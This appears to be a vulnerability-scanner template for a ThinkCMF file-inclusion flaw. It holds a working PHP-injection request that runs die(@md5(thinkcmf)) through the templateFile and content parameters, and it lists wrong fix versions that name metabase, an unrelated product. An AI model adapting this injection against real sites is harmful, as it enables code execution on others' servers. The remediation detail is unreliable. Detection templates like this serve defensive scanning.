expression: r0()
id: thinkcmf-file-include
info:
  author: rain
  description: "\u5728\u53D7\u5F71\u54CD\u7684\u7248\u672C\u4E2D,\u53EF\u901A\u8FC7\
    \u6F0F\u6D1E\u5B9E\u73B0\u4EFB\u610F\u6587\u4EF6\u5199\u5165\u6216\u4EFB\u610F\
    \u4EE3\u7801\u6267\u884C\n\u5F71\u54CD\u7248\u672C:\n  thinkCMFX 1.6.0-2.2.3\n\
    \u4FEE\u590D\u7248\u672C:\n  metabase version >= 0.40.5\n  metabase version >=\
    \ 1.40.5\n"
  name: "thinkCMF \u6587\u4EF6\u5305\u542B"
  reference:
  - https://www.thinkcmf.com/
  severity: Critical
rules:
  r0:
    expression: response.status == 200 && "3bedf9f6e16de1cb5403356aaa7bec38".bmatches(response.body)
    request:
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101
          Firefox/104.0
      method: GET
      path: /?a=fetch&templateFile=public/index&prefix="&content=die(@md5(thinkcmf))
